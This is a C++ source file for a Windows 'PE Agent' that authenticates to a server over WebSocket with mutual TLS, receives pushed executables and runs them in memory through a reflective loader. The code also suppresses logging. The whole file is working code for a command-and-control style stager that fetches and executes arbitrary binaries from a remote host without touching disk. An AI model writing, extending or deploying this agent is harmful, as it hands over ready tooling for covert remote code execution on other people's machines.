/*
 * PE Agent — WebSocket + mTLS client
 * ====================================
 * Connects to the FastAPI server, authenticates with a client certificate,
 * then waits for the server to push PE binaries and runs them in-memory.
 *
 * Dependencies (vcpkg):
 *   vcpkg install openssl websocketpp boost-asio nlohmann-json
 *
 * Compile (MSVC example):
 *   cl agent.cpp /I<vcpkg>/include /link <vcpkg>/lib/libssl.lib \
 *      <vcpkg>/lib/libcrypto.lib /EHsc
 *
 * Certificates expected next to the binary:
 *   ca.crt      — the private CA that signed both sides
 *   agent.crt   — this agent's certificate (CN = agent-001)
 *   agent.key   — private key for the agent certificate
 */

#include <windows.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <functional>

// --- WebSocket++ + OpenSSL TLS ---
#define ASIO_STANDALONE
#include <websocketpp/config/asio_client.hpp>
#include <websocketpp/client.hpp>

// --- JSON (nlohmann) ---
#include <nlohmann/json.hpp>

using json   = nlohmann::json;
using WssTLS = websocketpp::config::asio_tls_client;
using Client = websocketpp::client<WssTLS>;
using SslCtx = websocketpp::lib::shared_ptr<boost::asio::ssl::context>;
using MsgPtr = websocketpp::config::asio_tls_client::message_type::ptr;
using ConHdl  = websocketpp::connection_hdl;

// ---------------------------------------------------------------------------
// Forward declarations from loader.cpp (compiled together)
// ---------------------------------------------------------------------------
BOOL LoadPEFromMemory(LPVOID peBytes, SIZE_T size);

// ---------------------------------------------------------------------------
// TLS context factory — loads our certificates and enforces mTLS
// ---------------------------------------------------------------------------
SslCtx CreateTLSContext()
{
    auto ctx = websocketpp::lib::make_shared<boost::asio::ssl::context>(
        boost::asio::ssl::context::tls_client);

    // Verify the server's certificate against our private CA
    ctx->set_verify_mode(boost::asio::ssl::verify_peer |
                         boost::asio::ssl::verify_fail_if_no_peer_cert);
    ctx->load_verify_file("ca.crt");

    // Present our own certificate so the server can verify us (mTLS)
    ctx->use_certificate_file("agent.crt", boost::asio::ssl::context::pem);
    ctx->use_private_key_file("agent.key",  boost::asio::ssl::context::pem);

    return ctx;
}

// ---------------------------------------------------------------------------
// Message state machine
// The server sends two frames per PE:
//   Frame 1 (text)   — JSON header: { "type": "pe_push", "size": N, "filename": "..." }
//   Frame 2 (binary) — raw PE bytes
// ---------------------------------------------------------------------------
struct AgentState {
    bool        expectingBinary = false;
    size_t      expectedSize    = 0;
    std::string filename;
};

void OnMessage(AgentState& state, Client* client, ConHdl hdl, MsgPtr msg)
{
    if (msg->get_opcode() == websocketpp::frame::opcode::text)
    {
        // --- Frame 1: JSON header ---
        try {
            auto header = json::parse(msg->get_payload());
            if (header.value("type", "") == "pe_push") {
                state.expectedSize    = header["size"].get<size_t>();
                state.filename        = header.value("filename", "payload");
                state.expectingBinary = true;
                printf("[agent] Incoming PE: '%s' (%zu bytes)\n",
                       state.filename.c_str(), state.expectedSize);
            }
        } catch (...) {
            printf("[agent] Unknown text message: %s\n",
                   msg->get_payload().c_str());
        }
    }
    else if (msg->get_opcode() == websocketpp::frame::opcode::binary)
    {
        // --- Frame 2: raw PE bytes ---
        if (!state.expectingBinary) {
            printf("[agent] Unexpected binary frame — ignoring\n");
            return;
        }

        const std::string& payload = msg->get_payload();
        if (payload.size() != state.expectedSize) {
            printf("[agent] Size mismatch: got %zu, expected %zu\n",
                   payload.size(), state.expectedSize);
            state.expectingBinary = false;
            return;
        }

        printf("[agent] Received %zu bytes — loading into memory\n",
               payload.size());

        // Copy into a writable buffer and hand to the PE loader
        std::vector<BYTE> pe(payload.begin(), payload.end());
        BOOL ok = LoadPEFromMemory(pe.data(), pe.size());
        printf("[agent] LoadPEFromMemory returned: %s\n", ok ? "TRUE" : "FALSE");

        state.expectingBinary = false;
    }
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------
int main(int argc, char* argv[])
{
    // Default server — override with first argument
    std::string url = (argc >= 2) ? argv[1] : "wss://localhost:8443/agent";
    printf("[agent] Connecting to %s\n", url.c_str());

    Client      client;
    AgentState  state;

    // Suppress websocketpp internal logging
    client.clear_access_channels(websocketpp::log::alevel::all);
    client.clear_error_channels(websocketpp::log::elevel::all);

    client.init_asio();
    client.set_tls_init_handler([](ConHdl) { return CreateTLSContext(); });

    // Wire up the message handler
    client.set_message_handler(
        [&state, &client](ConHdl hdl, MsgPtr msg) {
            OnMessage(state, &client, hdl, msg);
        });

    client.set_open_handler([&url](ConHdl) {
        printf("[agent] Connected and authenticated\n");
    });

    client.set_close_handler([](ConHdl) {
        printf("[agent] Connection closed\n");
    });

    client.set_fail_handler([](ConHdl) {
        printf("[agent] Connection failed — check certificate / server address\n");
    });

    // Connect and run the ASIO event loop (blocks until disconnected)
    websocketpp::lib::error_code ec;
    auto con = client.get_connection(url, ec);
    if (ec) {
        printf("[agent] get_connection error: %s\n", ec.message().c_str());
        return 1;
    }

    client.connect(con);
    client.run();   // blocks here — reconnect logic can wrap this in a loop

    return 0;
}